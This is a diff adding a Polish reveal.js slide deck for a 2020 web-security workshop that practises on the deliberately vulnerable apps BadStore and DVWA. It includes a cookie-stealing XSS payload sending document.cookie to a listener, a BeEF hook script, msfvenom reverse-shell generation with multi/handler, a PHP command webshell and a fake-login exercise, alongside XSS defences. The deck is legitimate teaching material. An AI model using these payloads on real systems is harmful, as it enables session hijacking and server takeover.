@@ -1,0 +1,921 @@
+<!doctype html>
+<html lang="pl">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Hackowanie aplikacji webowej na żywo – ataki phishingowe i backdoory</title>
+
+		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+		<meta name="author" content="Hakim El Hattab">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/league.css" id="theme">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+		
+		<style>
+			.reveal table th, .reveal table td {border-bottom: 0px;}
+			html.dimbg .slide-background {
+				opacity: 0.2 !important;
+			}
+			
+			#no-header {
+				visibility: hidden;
+				display: none;
+			}
+		</style>
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+		
+		
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				
+					<section data-background="pictures/tlo_1.jpg" data-state="dimbg">
+						<h2>Hackowanie aplikacji webowej na żywo – ataki phishingowe i backdoory</h2>
+						<p>
+							<h3>Testaton 2020 - 28.03.2020</h3>
+						</p>
+						<p style="text-align:right"><a href="http://www.linkedin.com/in/klara-trzcinska">Klara Trzcińska</a></p>
+					</section>
+				
+				<section>	
+					<section>
+						<h2>Informacje organizacyjne</h2>
+					</section>
+					
+					<section>
+						<h3>O mnie</h3>
+						<p>Jestem specjalistką ds. zapewnienia jakości i bezpieczeństwa oprogramowania z doświadczeniem w <b>testach bezpieczeństwa aplikacji webowych</b> oraz infrastruktury, testach wydajnościowych oraz testach technicznych. Pracuję jako Główny Specjalista w firmie Pentacomp Systemy Informatyczne, gdzie nie tylko wykonuje testy, ale także koordynuje pracę zespołu.
+						Moim głownym zainteresowaniem są testy bezpieczeństwa aplikacji webowych.</p>
+					</section>
+					
+					<section>
+						<h3>O Pentacomp</h3>
+						<p>Jesteśmy niezależnym producentem rozwiązań informatycznych i dostawcą profesjonalnych usług IT dla klientów z wybranych branż gospodarki i sektora publicznego. Dysponujemy wieloletnim doświadczeniem w realizacji strategicznych projektów dla największych w Polsce organizacji.</p>				
+						<img height="200" data-src="pictures/PC_Logo_www.jpg" alt="Pentacomp" style="border:none; box-shadow:none;">
+					</section>
+					
+					<section>
+						<h3>O Women in Technology</h3>
+						<p>Jesteśmy społecznością kobiet skupionych wokół IT i nowych technologii, zarówno ekspertek zajmujących stanowiska seniorskie, jak i osób rozwijających swoje umiejętności. Tworzymy przestrzeń sprzyjającą wymianie wiedzy i wspierającą rozwój.</p>
+						<img height="200" data-src="pictures/nowe_logo_WiT-02.png" alt="Women in Technology" style="border:none; box-shadow:none; background-color:white;">
+					</section>
+					
+					<section>
+                        <h3>Kwestie organizacyjne</h3>
+                        <ul>
+                            <li>Jeśli nikt nie ma nic przeciwko, zwracajmy się na "Ty".</li>
+                            <li>Co około 90 minut zrobimy 10-minutową przerwę.</li>
+                            <li>Pytania zadawajcie na bieżąco.</li>
+                        </ul>
+                    </section>
+					
+					<section>
+						<h3>O was</h3>
+						<p><iframe src="https://docs.google.com/forms/d/e/1FAIpQLSe0Ik4v9iShWYoR0O22dFEitX88GiNQaTNvQ3lWXDMIPI5Utg/viewform?embedded=true" style='height:100%;width:100%' width="640" height="1770" frameborder="0" marginheight="0" marginwidth="0">Ładuję…</iframe></p>
+					</section>	
+					
+					<section>
+                        <h3>Code of Ethics</h3>
+                        <p>Prezentowanych na warsztatach technik nie stosujemy na systemach bez zgody właściciela.</p>
+                    </section>
+					
+					<section>
+                        <h3>Korzystanie z prezentacji</h3>
+                        <ul>
+                            <li>Kliknięcie ESC wyświetla widok aktualnego slajdu i pozostałych slajdów.</li>
+							<li>Wybranie ikony w lewym dolnym rogu lub wciśnięcie klawisza <i>m</i> powoduje pojawienie się menu nawigacyjnego.</li>   
+                        </ul>
+                    </section>
+					
+					<section>
+					<h3>Agenda (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Aplikacje testowe - BadStore i DVWA</li>
+							<li>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
+							<li>XSS metody ochrony i przykłady</li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Agenda (II)</h3>
+						<ul>
+							<li>Metasploit i zdalne przejęcie kontroli nad serwerem</li>
+							<li>Skanery umożliwiające automatyczne testy bezpieczeństwa</li>
+							<li>Nagłówki bezpieczeństwa</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Wprowadzenie</h2>
+					</section>
+					
+					<section>
+						<h3>Jakie są najczęściej występujące podatności aplikacji webowych? O jakich podatnościach ostatnio słyszeliście?</h3>
+						<small>
+						<a href="https://www.commonplaces.com/blog/6-common-website-security-vulnerabilities/">Most Common Website Security Vulnerabilities</a>
+						</small>
+					</section>				
+					
+					<section>
+						<h3>Statystyki 2014 - 2018 - raport Imperva</h3>
+						<img height="360" data-src="pictures/statistics2018.png" alt="Statystyki Imperva">
+						<p>Statystyki podatności w latach 2014 - 2018 według <a href="https://www.imperva.com/blog/the-state-of-web-application-vulnerabilities-in-2018/">raportu</a> Imperva</p>
+					</section>
+					
+					<section>
+                        <h3>Motywacja</h3>
+                        <ul>
+                            <li>Wykonanie podstawowych testów bezpieczeństwa nie jest trudne.</li>
+							<li>Umiejętność wykrywania podstawowych podatności pomoże wykryć je na wczesnym etapie projektu.</li>
+							<li>Im wcześniej błąd zostanie wykryty tym łatwiej i taniej jest go naprawić.</li>
+                        </ul>
+                    </section>
+					
+					<section>
+                        <h3>Test penetracyjny</h3>
+                        <ul>
+                            <li>Kontrolowany atak na system teleinformatyczny.</li>
+							<li>Umożliwia praktyczną ocenę stanu bezpieczeństwa.</li>
+							<li>Pentester wciela się w rolę potencjalnego włamywacza.</li>
+                        </ul>
+                    </section>
+				</section>
+				
+				<section>
+				
+					<section>
+						<h2>Aplikacje do ćwiczeń</h2>
+					</section>
+					
+					<section>
+						<h3>BadStore - aplikacja do ćwiczeń</h3>
+						<img height="350" data-src="pictures/BadStore.png" alt="Burp Suite">
+						<p>Aplikacja dosyć stara, pierwsze wydanie 2004 rok ale nadal opisywana na blogach, posiada praktycznie wszystkie najważniejsze podatności.</p>
+					</section>
+				
+					<section>
+						<h3>DVWA - aplikacja do ćwiczeń</h3>
+						<img height="400" data-src="pictures/dvwa.png" alt="DVWA">
+						<p>Pierwsze wydanie 2008, aplikacja webowa napisana w PHP/MySQL.</p>
+					</section>
+					
+					<section>
+						<h3>DVWA - zmiana poziomu zabezpieczeń</h3>
+						<img height="500" data-src="pictures/dvwa_sec.png" alt="DVWA Security level">
+					</section>
+					
+					<section>
+						<h3><a href="https://hub.docker.com/r/jvhoof/badstore-docker/">Docker BadStore</a></h3>
+						<pre><code class="html" data-trim contenteditable>
+						docker pull jvhoof/badstore-docker
+						docker run -d -p 80:80 jvhoof/badstore-docker
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3><a href="https://hub.docker.com/r/vulnerables/web-dvwa/">Docker DVWA</a></h3>
+						<pre><code class="html" data-trim contenteditable>
+						docker pull vulnerables/web-dvwa
+						docker run --rm -it -p 8080:80 vulnerables/web-dvwa
+						</code></pre>
+					</section>		
+				</section>
+				
+				<section>
+					<section>
+						<h2>Lokalne Proxy</h2>
+					</section>
+					
+					<section>
+						<h3>Narzędzia typu lokalnego Proxy</h3>
+							<ul>
+								<li>Proxy jest zainstalowane na komputerze testującego.</li>
+								<li>Przeglądarka łączy się z Proxy, a następnie Proxy łączy się z żądaną stroną internetową.</li>
+								<li>Dzięki takiemu połączeniu możliwe jest przechwytywanie oraz zmiana danych wysyłanych pomiędzy przeglądarką, a serwerem.</li>
+							</ul>
+					</section>
+					<section>
+						<h3>Burp Suite (I)</h3>
+						<img height="420" data-src="pictures/burp.png" alt="Burp Suite">
+						<p>Bardzo popularne narzędzie wykorzystywane podczas testów bezpieczeństwa.</p>
+					</section>
+					<section>
+						<h3>Burp Suite (II)</h3>
+							<ul>
+								<li>Szczegółowa analiza i obróbka zapytań oraz odpowiedzi.</li>
+								<li>Możliwość powtórzenia i modyfikowania przesłanych wcześniej żądań.</li>
+								<li>Łatwe przenoszenie zapytań pomiędzy różnymi narzędziami.</li>
+								<li>Skaner automatyczny (pasywny i aktywny).</li>
+							</ul>
+					</section>
+					<section>
+						<h3>Instalacja certyfikatu Burp - Firefox</h3>
+						<img height="350" data-src="pictures/BurpCA.png" alt="Burp Suite">
+						<p>Podczas importu certyfikatu należy zaznaczyć opcję <i>Trust this CA to identify web sites</i></p>
+					</section>
+					
+					<section>
+						<h3>Instalacja certyfikatu Burp - IE</h3>
+						<img height="400" data-src="pictures/ie_cert.png" alt="Burp Suite">
+						<p><small><i>The Chrome browser picks up the certificate trust store from your host computer. By installing Burp's CA certificate in your computer’s built-in browser (e.g. Internet Explorer on Windows, or Safari on OS X), Chrome will automatically make use of the certificate.</i></small></p>
+					</section>
+					
+					<section>
+						<h3>Alternatywa - OWASP ZAP</h3>
+						<img height="558" data-src="pictures/zap.png" alt="OWASP ZAP">
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 1</h2>
+						<p style="text-align: left;">Konfiguracja lokalnego Proxy i przechwytywanie żądań do aplikacji BadStore i DVWA.</p>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Cross-Site Scripting - XSS</h2>
+					</section>
+				
+					<section>
+						<h3>Cross-Site Scripting - XSS (I)</h3>
+						<ul>
+							<li>Atak polegający na osadzeniu w treści atakowanej strony kodu, zazwyczaj JavaScript, który wyświetlany jest użytkownikowi.</li>
+							<li>Atakujący może wykonać skrypt po stronie użytkownika aplikacji internetowej porywając między innymi jego sesje lub powodując przekierowanie na inną stronę.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Cross-Site Scripting - XSS (II)</h3>
+						<ul>
+							<li>Reflected XSS (Nonpersistent XSS)</li>
+							<li>Persistent XSS (Stored XSS)</li>
+							<li>Oparte o DOM (DOM XSS)</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Stored XSS</h3>
+						<img height="338" data-src="pictures/Obraz1.png" alt="Regular expression">
+					</section>
+					
+					<section>
+						<h3>Reflected XSS</h3>
+						<img height="338" data-src="pictures/Obraz2.png" alt="Regular expression">
+					</section>
+					
+					<section>
+						<h3>XSS Lokator</h3>
+						Testy można wykonać manualnie, przesyłając w każdym możliwym parametrze, którego wartość jest zwracana użytkownikowi tzw. lokator XSS w postaci znaków:
+						<pre><code class="hljs" data-trim contenteditable>
+						'';!--"&lt;XSS&gt;=&{()}
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>XSS Standardowy Payload</h3>
+						Testy można wykonać z wykorzystaniem standardowego payloadu powodującego wyświetlenie okna z alertem:
+						<pre><code class="hljs" data-trim contenteditable>
+						&lt;script&gt;alert(1)&lt;/script&gt;
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Przykład wykonania XSS</h3>
+						<img height="538" data-src="pictures/xss_bs.png" alt="XSS example">
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 2</h2>
+						<ul>
+								<li>Znalezienie w aplikacji BadStore podatność XSS Reflected,</li>
+								<li>Znalezienie w aplikacji BadStore podatność XSS Stored,</li>
+								<li>Wykorzystać podatność XSS do przesłania identyfikatora sesji,</li>
+								<li>Podmiana identyfikatora sesji i przejęcie sesji innego użytkownika.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Serwer HTTP z wykorzystaniem Pythona</h3>
+						Python 2.x
+						<pre><code class="hljs" data-trim contenteditable>
+						python -m SimpleHTTPServer 9000
+						</code></pre>
+						Python 3.x
+						<pre><code class="hljs" data-trim contenteditable>
+						python -m http.server 9000
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Kradzież plików cookie</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+						&lt;script&gt;location.href = 'http://192.168.1.14:9000/Stealer.php?cookie='+document.cookie;&lt;/script&gt;
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>				
+					<section>
+						<h2>Wykorzystanie podatności Cross-Site Scripting (XSS)</h2>
+					</section>
+				
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (I)</h3>
+						Pakiet pozwala na wykorzystanie podatności XSS np. wyświetlenie okna dialogowego, uruchomienie dźwięku, pobranie plików cookie, czy zawartości schowka. 
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (II)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							&lt;script src="http://192.168.1.14:3000/hook.js">&lt;/script&gt;
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (III)</h3>
+						Panel logowania:
+						<a href="http://192.168.1.14:3000/ui/authentication">http://192.168.1.14:3000/ui/authentication</a>
+						Użytkownik testowy beef/beef<br>
+						Uwaga!
+						Możliwa jest tylko jedna aktywna sesja użytkownika beef.
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (IV)</h3>
+						<img height="498" data-src="pictures/beef.png" alt="Beef">
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (V)</h3>
+						<ul>
+								<li>Social Engineering</li>
+								<ul>
+									<li>Fake Notification</li>
+									<li>Google Phishing</li>
+									<li>Pretty Theft</li>
+								</ul>
+								<li>Browser</li>
+								<ul>
+									<li>Webcam HTML5</li>
+									<li>Hooked Domain</li>
+									<ul>
+										<li>Get page HTML</li>
+										<li>Get cookie</li>
+									</ul>
+								</ul>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 3</h2>
+						<ul>
+								<li>Uruchomienie BeEF i zapoznanie z podstawową funkcjonalnością,</li>
+								<li>Wykonanie wybranych ataków z zakładki Social Engineering i Browser.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>XSS - Metody ochrony</h2>
+					</section>
+					
+					<section>
+						<h3>Enkodowanie</h3>
+						Filtrowanie danych przesyłanych przez użytkownika przed ich wyświetleniem w aplikacji - enkodowanie:
+						<img height="400" data-src="pictures/encoding.jpg" alt="Encoding">
+					</section>
+					
+					<section>
+						<h3>HttpOnly i .NET Request Validation</h3>
+						<ul>
+							<li>Zastosowanie parametru HttpOnly dla sesyjnych plików cookie.</li>
+							<li>Stosowanie innych mechanizmów ochrony np. .net request validation</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Przykładowy podatny kod</h3>
+						Fragment kodu odpowiadający za dodawanie danych (aplikacja .NET):
+						<pre><code class="hljs" data-trim contenteditable>
+						foreach (var item in currentRow)
+						{
+							cleanedRows.Add(StringHelper.CleanSpaces(item.Value));
+						}
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Przykładowy poprawiony kod</h3>
+						Podatność można usunąć w następujący sposób:
+						<pre><code class="hljs" data-trim contenteditable>
+						foreach (var item in currentRow)
+						{
+							cleanedRows.Add(AntiXssEncoder.HtmlEncode(StringHelper.CleanSpaces(item.Value), false));
+						}
+						</code></pre>
+						Metoda AntiXssEncoder.HtmlEncode odpowiada za encodowanie wprowadzonych znaków. Od wersji .NET 4.5 moduł anty-XSS jest wbudowaną częścią frameworku. Dla wcześniejszych wersji konieczne było pobranie odpowiedniej biblioteki.
+					</section>
+					
+					<section>
+						<h3>Content Security Policy</h3>
+						<i>Content Security Policy pozwala twórcy aplikacji webowej na ścisłe zdefiniowanie, skąd mogą pochodzić dodatkowe zasoby, z których korzysta aplikacja www (pliki zewnętrzne JavaScript czy CSS, obrazki i inne elementy multimedialne). <br><br>Ograniczenie to ma zapobiegać atakom XSS, które dołączają do źródeł strony skrypty doczytywane z innych lokalizacji sieciowych.</i>
+						<br><a href="https://sekurak.pl/czym-jest-content-security-policy/">Sekurak - Czym jest Content Security Policy?</a>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection (I)</h3>
+						<ul>
+							<li>Nagłówek podaje w jaki sposób ma być wykorzystany wbudowany filtr przeciwdziałający atakom Reflected XSS.</li>
+							<li>Działanie filtru przeglądarki opiera się na sprawdzeniu czy w treści przesyłanego żądania HTTP znajdują się tagi HTML lub fragmenty kodu JavaScript – oraz czy później wysyłane fragmenty kodu znajdują się w odpowiedzi, jeśli tak wykonanie takiego kodu jest blokowane.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection (II)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							X-XSS-Protection: 0
+							X-XSS-Protection: 1
+							X-XSS-Protection: 1; mode=block
+							X-XSS-Protection: 1; report=&lt;reporting-uri&gt;
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection: 0</h3>
+						<p>
+						Filtr XSS jest wyłączony, nie jest wykorzystywana ochrona po stronie przeglądarki.
+						</p>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection: 1</h3>
+						<p>
+						Filtr XSS jest włączony (zazwyczaj domyślne w przeglądarkach). W przypadku wykrycia ataku Cross-Site Scripting, przeglądarka usuwa ze strony fragmenty uznane za niebezpieczny skrypt.
+						</p>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection: 1; mode=block</h3>
+						<p>
+						Filtr XSS jest włączony w trybie, w którym wykrycie próby ataku XSS skutkuje przerwaniem renderowania strony (wyświetlana jest tylko biała strona).
+						</p>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection: 1; report=&lt;reporting-uri&gt;</h3>
+						<p>
+						Opcja dostępna tylko w przeglądarce Chromium - filtr XSS jest włączony, w przypadku wykrycia ataku Cross-Site Scripting przeglądarka usuwa ze strony fragmenty uznane za niebezpieczny skrypt i zgłasza naruszenie;<br><br> w tym celu wykorzystywana jest funkcjonalność dyrektywy report-uri mechanizmu CSP, wykorzystywanej do raportowania naruszeń.
+						</p>
+					</section>
+					
+					<section>
+						<h3>Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (I)</h3>
+					</section>
+					
+					<section>
+						<h3>Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (II)</h3>
+						<ul>
+							<li>Nagłówek należy ustawiać jako X-XSS-Protection: 1; mode=block, standardowo uznaje się że jest to najbezpieczniejsza opcja – zalecana m. in. przez OWASP.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (III)</h3>
+						<ul>
+							<li>Nie jest zalecane zostawianie domyślnych wartości nagłówka, ponieważ wielokrotnie pokazane zostało, że w specyficznych przypadkach filtr XSS ustawiony jako X-XSS-Protection: 1 może spowodować wykonanie wprowadzonego skryptu w sytuacji, w której bez filtra nie było to możliwe.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection (III)</h3>
+						<ul>
+							<li>Nagłówek bezpieczeństwa wprowadzał podatność tam gdzie jej nie było!</li>
+							<li>Implementacja filtra polegała na zastąpieniu fragmentu uznanego za niebezpieczny skrypt znakiem #.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>X-XSS-Protection (IV)</h3>
+						<ul>
+							<li>Błędy w implementacji powodowały że przez # zastępowany był fragment tagu HTML, payload nie był zmieniany, a modyfikacja innego elementu strony np. zamknięcia tagu style umożliwiała wykonanie ataku z wykorzystaniem składni CSS.</li>
+						</ul>
+						<a href="https://www.slideshare.net/masatokinugawa/xxn-en">Prezentacja na temat podatności</a>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 4</h2>
+						<ul>
+								<li>Opracowanie przykładowego scenariusza ataku z wykorzystaniem podatności XSS.</li>
+								<li>Przygotowanie fałszywego okna logowania do innego systemu.</li>
+						</ul>
+						<br><br>
+						Podpowiedź: <a href="https://resources.infosecinstitute.com/deadly-consequences-xss/">https://resources.infosecinstitute.com/deadly-consequences-xss/</a>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Przykładowe podatności XSS z popularnych serwisów</h2>
+					</section>
+					
+					<section>
+						<h3>Przykład #1 – Facebook (I)</h3>
+						<ul>
+							<li>Podatność związana z funkcją dodawania plików pochodzących bezpośrednio z Dropboxa.</li>
+							<li>Znaki specjalne w nazwie pliku nie były poprawnie filtrowane, dlatego dodanie pliku o nazwie: <i>&apos;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;.txt</i> skutkowało wykonaniem skryptu przez przeglądarkę i pojawieniem się okna z nazwą domeny.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Przykład #1 – Facebook (II)</h3>
+						<ul>
+							<li>Do wykonania skryptu dochodziło bezpośrednio po dodaniu pliku, po wybraniu opcji Share.</li>
+							<li>Jedyną trudnością było tutaj dodanie pliku o takiej nazwie do Dropboxa, nie było to możliwe bezpośrednio przez formularz uploadu ale nie stanowiło problemu jeśli utworzyło się taki plik lokalnie, a następnie zsynchronizowało katalog z Dropboxem. </li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Przykład #1 – Facebook (III)</h3>
+							<img height="400" data-src="pictures/xss_fb.jpg" alt="XSS FB">
+							<p><a href="https://blog.detectify.com/2012/12/30/how-i-hacked-facebook-and-received-a-3500-usd-facebook-bug-bounty/">Więcej informacji</a></p>
+					</section>
+					
+					<section>
+						<h3>Przykład #2 – Linkedin (I)</h3>
+						<ul>
+							<li>Podatny na ataki XSS był formularz tworzenia nowej dyskusji, a dokładnie pole o nazwie More Details.</li>
+							<li>Wprowadzenie w to pole wartości: <i>&lt;&lt;a&gt;&lt;/a&gt;body onload=alert(&apos;xss&apos;)&gt; </i> skutkowało trwałym zapisaniem w aplikacji payloadu XSS, a następnie jego wykonywaniem przez przeglądarki wszystkich użytkowników czytających daną dyskusję.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Przykład #2 – Linkedin (II)</h3>
+							<img height="400" data-src="pictures/xss_li.jpg" alt="XSS LI">
+							<p><a href="https://www.zdnet.com/article/linkedin-patches-serious-xss-vulnerability/ ">Więcej informacji</a></p>
+					</section>
+				
+				</section>			
+					
+				<section>
+					<section>
+						<h2>Metasploit</h2>
+					</section>
+										
+					<section>
+						<h3>Metasploit - podstawowe informacje (I)</h3>
+						Metasploit to otwarte narzędzie służące do testów penetracyjnych i łamania zabezpieczeń systemów teleinformatycznych. Metasploit zawiera bazę gotowych exploitów oraz udostępnia interfejs, dzięki któremu można przygotowywać własne, korzystając z gotowych komponentów.
+					</section>
+					
+					<section>
+						<h3>Metasploit - podstawowe informacje (II)</h3>
+						Jest to narzędzie umożliwiające wykorzystanie dostępnej bazy exploitów do wykonania ataku (poprzez wykorzystanie luki w zabezpieczeniach) i uzyskanie dostępu do atakowanego systemu, czyli przeprowadzenie symulacji włamania.
+					</section>
+					
+					<section>
+						<h3>Metasploit - podstawowe informacje (III)</h3>
+					Projekt Metasploit składa się z kilku podprojektów: projektu open-source Metasploit Framework oraz projektów komercyjnych Metasploit Pro, Express, Community, and Nexpose Ultimate.
+					</section>
+					
+					<section>
+						<h3>Metasploit - uruchomienie</h3>
+						<img height="550" src="pictures/metasploit.png">
+					</section>
+					
+					<section>
+						<h3>Metasploit - historia</h3>
+						<ul>
+							<li>2003 – Stworzony przez HD Moore’a - sieciowa aplikacja w Perlu</li>
+							<li>2007 – Przepisanie MS na Ruby</li>
+							<li>2009 – Przejęcie przez Rapid7 - MetasploitExpress i MetasploitPro</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Moduły Metasploit</h3>
+						<ul>
+							<li><b>Moduły pomocnicze</b> - nie zwracają powłoki - zapewnienie szerokiego wachlarza narzędzi np. skanowanie.</li>
+							<li><b>Moduły do włamań</b> - kod pozwalający na wykorzystanie podatności i uzyskanie dostepu do powłoki serwera.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Moduły Metasploit</h3>
+						<ul>
+							<li><b>Moduły enkoderów</b> - odpowiadają za takie przekształcenie kodu wykorzystującego lukę aby nie został on wykryty przez program antywirusowy, czy inne mechanizmy ochrony.</li>
+							<li><b>Moduły ładunku</b> - zapewniają ładunek umożliwiający wykorzystanie luki i uzyskanie dostępu do systemu.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Metasploit - przykładowe polecenia</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							msfconsole
+							show payloads
+							show exploits
+							show encoders
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Vulnerability - Exploit - Payload</h3>
+						<img src="https://i.stack.imgur.com/2mykq.png">
+					</section>
+					
+					<section>
+						<h3>Vulnerability - Exploit - Payload</h3>
+						<ul>
+							<li>Moduł Payload - Ładunek dostarczany wraz z exploitem.</li>
+							<li>Moduł Exploit - Wykorzystuje lukę w oprogramowaniu</li>
+						</ul>
+						<p></p>
+					</section>
+					
+					<section>
+						<h3>Msfvenom</h3>
+						<ul>
+							<li>Msfvenom służy do generowania i kodowania ładunków payload metasploit.</li>
+							<li>msfpayload + msfencode</li>
+							<li>Od czerwca 2015 msfvenom zastępuje msfpayload i msfencode</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Msfvenom - wybrane argumenty</h3>	
+						<ul>
+							<li>-p <i>payload</i> –wybór payloadu</li>
+							<li>-n <i>długość</i> -pułapka NOP</li>
+							<li>-f <i>format</i> -format pliku wynikowego</li>
+							<li>-e <i>encoder</i> -wybór encodera</li>
+							<li>-a <i>architektura</i> -wybór architektury procesora</li>
+							<li>--platform <i>platforma</i> -wybór platformy</li>
+							<li>-o <i>ścieżka</i> -ścieżka do pliku wynikowego</li>
+							<li>-x <i>ścieżka</i> -ścieżka do bazowego pliku wykonywalnego</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Msfvenom - lista obsługiwanych payloadów</h3>						
+						<pre><code class="hljs" data-trim contenteditable>
+						msfvenom -l payloads	
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Msfvenom - przykłady payloadów</h3>						
+						<pre><code class="hljs" data-trim contenteditable>
+						windows/x64/meterpreter_reverse_tcp
+						windows/messagebox
+						solaris/x86/shell_reverse_tcp
+						python/meterpreter_reverse_https
+						php/meterpreter/reverse_tcp
+						osx/x86/shell_reverse_tcp
+						linux/x64/shell/reverse_tcp	
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Msfvenom - rodzaje payloadów</h3>
+						<ul>
+							<li><b>bind_tcp</b> - na komputerze celu tworzony jest serwer nasłuchujący, atakujący musi nawiązać połączenie.</li>
+							<li><b>reverse_tcp</b> - komputer ofiary wykonuje połaczenie do atakującego, który nasłuchuje na podanym wcześniej w konfiguracji payloada adresie i porcie.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Msfvenom - generowanie payloadu</h3>						
+						<pre><code class="hljs" data-trim contenteditable>
+						msfvenom -p php/meterpreter/reverse_tcp lhost=127.0.0.1 lport=11000 -f raw	
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Msfveonm - polecenia</h3>
+						<img height="550" src="pictures/met_polecenia.png">
+					</section>
+					
+					<section>
+						<h3>multi/handler</h3>						
+						<p>Jeżeli wybraliśmy ładunek typu reverse_tcp, należy nasłuchiwać przychodzących połączeń na porcie 11000.</p>
+					</section>
+					
+					<section>
+						<h3>multi/handler - nasłuchiwanie połączenia ofiary z ładunkiem</h3>						
+						<pre><code class="hljs" data-trim contenteditable>
+						msf > use multi/handler
+						msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+						msf exploit(handler) > set lhost 127.0.0.1
+						msf exploit(handler) > set lport 11000
+						msf exploit(handler) > run
+						meterpreter > sysinfo
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 5</h2>
+						Przejęcie kontroli nad serwerem. Testy wykonujemy na aplikacji DVWA - funkcjonalność uplaodu plików.
+						<ul>
+								<li>Wygenerowanie payloadu (msfvenom).</li>
+								<li>Wgranie do aplikacji.</li>
+								<li>Przejęcie kontroli nad serwerem (multi/handler).
+						</ul>
+						<br><br>
+						Podpowiedź: <a href="https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/">https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/</a>
+					</section>
+				</section>
+					
+				<section>
+					<section>
+						<h2>Ćwiczenie 6</h2>
+						Przygotowanie najprostrzego webshella.
+						<pre><code class="php" data-trim contenteditable>
+						<?php if(isset($_REQUEST['cmd'])){ echo "&gt;pre>"; $cmd = ($_REQUEST['cmd']);
+						system($cmd); echo "&gt;/pre>"; die; } ?>
+						</code></pre>
+						<br>
+						Podpowiedź: <a href="https://nfsec.pl/pentest/6209">https://nfsec.pl/pentest/6209</a>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ankieta</h2>
+						<a href="https://forms.gle/egnVrg2dmdCHmhGr7">https://forms.gle/egnVrg2dmdCHmhGr7</a>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Skanery automatyczne</h2>
+					</section>
+					
+					<section>
+						<h3>Skanery automatyczne</h3>
+						<ul>
+							<li>Arachni</li>
+							<li>Nikto</li>
